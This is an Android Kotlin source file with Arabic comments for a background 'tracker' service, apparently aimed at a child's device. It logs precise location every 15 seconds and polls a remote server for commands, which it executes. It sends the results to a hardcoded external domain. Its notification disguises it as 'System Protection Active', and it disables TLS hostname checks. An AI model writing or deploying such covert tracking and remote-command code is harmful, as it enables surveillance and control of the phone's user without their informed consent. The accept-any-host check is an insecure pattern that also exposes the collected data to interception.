package com.abuzahra.tracker.services

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.BotServerClient
import com.abuzahra.tracker.CommandExecutor
import com.abuzahra.tracker.LocalStorageManager
import com.abuzahra.tracker.SharedPrefsManager
import com.abuzahra.tracker.TelegramDirectClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * MainTrackerService - الخدمة الرئيسية لتتبع الجهاز (الإصدار المباشر لتيليجرام)
 *
 * المعمارية الجديدة:
 * 1. تتبع الموقع الجغرافي وحفظه محلياً + إرساله مباشرة لتيليجرام
 * 2. مراقبة مستوى البطارية
 * 3. تشغيل استطلاع الأوامر من تيليجرام
 * 4. تشغيل DataSyncWorker بشكل دوري
 *
 * بدون سيرفر وسيط - التطبيق ←→ تيليجرام مباشرة
 */
class MainTrackerService : Service() {

    companion object {
        private const val TAG = "MainTrackerService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "tracker_channel"
        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L // 10 دقائق
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "تم إنشاء الخدمة الرئيسية (مباشر تيليجرام)")
        startForegroundServiceNotification()
        acquireWakeLock()
        startLocationUpdates()
        startBatteryMonitor()
        startServerCommandPolling()
    }

    // ==================== ==================== ====================
    //              إشعار الخدمة (Foreground Notification)
    // ==================== ==================== ====================

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Protection Active")
            .setContentText("Connected to Telegram directly")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    // ==================== ==================== ====================
    //              تتبع الموقع الجغرافي (Location Tracking)
    // ==================== ==================== ====================

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000).build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    updateLocation(location)
                }
            }
        }

        LocationServices.getFusedLocationProviderClient(this)
            .requestLocationUpdates(locationRequest, locationCallback, mainLooper)
    }

    /**
     * تحديث الموقع - يحفظ محلياً فقط (لا يرسل تلقائياً لتجنب الإزعاج)
     * المدير يطلب الموقع عبر /location
     */
    private fun updateLocation(location: Location) {
        val locationData = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy.toDouble(),
            "speed" to location.speed.toDouble(),
            "altitude" to location.altitude.toDouble(),
            "timestamp" to location.time,
            "date_readable" to java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                .format(java.util.Date(location.time)),
            "provider" to (location.provider ?: "unknown"),
            "collected_at" to System.currentTimeMillis()
        )

        // حفظ الموقع محلياً فقط
        LocalStorageManager.storeData(this, "location", locationData)
        Log.d(TAG, "تم حفظ الموقع محلياً: ${location.latitude}, ${location.longitude}")
    }

    // ==================== ==================== ====================
    //              مراقبة البطارية (Battery Monitor)
    // ==================== ==================== ====================

    private fun startBatteryMonitor() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                    val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

                    SharedPrefsManager.setLastHeartbeat(this@MainTrackerService, System.currentTimeMillis())
                    Log.d(TAG, "مراقبة البطارية: $batteryLevel%")

                    // تشغيل مزامنة البيانات
                    DataSyncWorker.startImmediate(this@MainTrackerService)

                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في مراقبة البطارية: ${e.message}")
                }

                // انتظار 60 ثانية قبل الجولة التالية
                delay(60000)
            }
        }
    }

    // ==================== ==================== ====================
    //         استقبال الأوامر من السيرفر (بدون getUpdates)
    // ==================== ==================== ====================

    private fun startServerCommandPolling() {
        serviceScope.launch(Dispatchers.IO) {
            Log.d(TAG, "بدء استطلاع الأوامر من السيرفر (بدون getUpdates)...")
            while (isActive) {
                try {
                    val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService)
                    if (deviceId != null) {
                        val cmds: List<com.abuzahra.tracker.BotServerClient.Command> = BotServerClient.getPendingCommands(deviceId)
                        if (cmds.isNotEmpty()) {
                            Log.d(TAG, "تم استلام ${cmds.size} أوامر من السيرفر")
                            for (cmd in cmds) {
                                try {
                                    val params = if (cmd.params != null) {
                                        val json = org.json.JSONObject()
                                        for ((k, v) in cmd.params) json.put(k, v)
                                        json
                                    } else {
                                        org.json.JSONObject()
                                    }
                                    // تنفيذ الأمر والحصول على النتيجة
                                    val result = CommandExecutor.execute(this@MainTrackerService, cmd.command, params)
                                    Log.d(TAG, "نتيجة الأمر ${cmd.command}: ${result.take(200)}")

                                    // إرسال النتيجة للسيرفر عبر API
                                    reportCommandResult(cmd.id ?: "", cmd.command, result, deviceId)
                                } catch (e: Exception) {
                                    Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
                                    reportCommandResult(cmd.id ?: "", cmd.command, "{\"ok\":false,\"error\":\"${e.message}\"}", deviceId)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في استطلاع السيرفر: ${e.message}")
                }
                delay(10_000) // فحص كل 10 ثوان
            }
        }
    }

    /**
     * إرسال نتيجة الأمر للسيرفر و Firebase
     */
    private fun reportCommandResult(cmdId: String, command: String, result: String, deviceId: String) {
        if (cmdId.isEmpty()) {
            Log.w(TAG, "معرف الأمر فارغ - لا يمكن إرسال النتيجة")
            return
        }
        serviceScope.launch(Dispatchers.IO) {
            try {
                // 1. إرسال النتيجة للسيرفر عبر REST API
                val serverUrl = "https://alsydyabwalzhra.online/api/command_result/$cmdId"
                val url = java.net.URL(serverUrl)
                val connection = url.openConnection() as java.net.HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.sslSocketFactory = javax.net.ssl.HttpsURLConnection.getDefaultSSLSocketFactory()
                connection.hostnameVerifier = javax.net.ssl.HostnameVerifier { _, _ -> true }

                val payload = "{\"status\":\"completed\",\"result\":${org.json.JSONObject.quote(result)}}"
                java.io.OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }

                val responseCode = connection.responseCode
                Log.d(TAG, "إرسال نتيجة الأمر $cmdId للسيرفر: $responseCode")
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إرسال نتيجة الأمر للسيرفر: ${e.message}")
            }
        }
    }

    // ==================== ==================== ====================
    //              إدارة الطاقة (Power Management)
    // ==================== ==================== ====================

    private fun acquireWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildApp::TrackerWakeLock")
        wakeLock?.acquire(WAKE_LOCK_TIMEOUT)
    }

    override fun onDestroy() {
        Log.d(TAG, "تم تدمير الخدمة الرئيسية")
        try {
            LocationServices.getFusedLocationProviderClient(this)
                .removeLocationUpdates(locationCallback)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إيقاف تحديث الموقع: ${e.message}")
        }
        // TelegramDirectClient.stopCommandPolling() - لا حاجة، getUpdates معطّل
        wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
